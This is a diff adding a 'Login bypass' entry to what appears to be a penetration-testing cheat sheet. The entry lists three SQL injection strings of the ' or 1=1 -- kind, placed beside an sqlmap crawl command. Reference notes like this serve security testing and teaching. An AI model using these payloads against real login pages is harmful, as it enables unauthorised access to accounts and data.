@@ -404,6 +404,13 @@ After a year of exploring in IT security. I have become lazy to copy and paste. 
   >
   > sqlmap -u http://example.com --crawl=1
   >
+- Login bypass
+  >
+  > ‘or 1=1- -
+  >
+  >‘ or ‘1’=1
+  >
+  >‘ or ‘1’=1 - -
 
 ### Broken Authentication
 
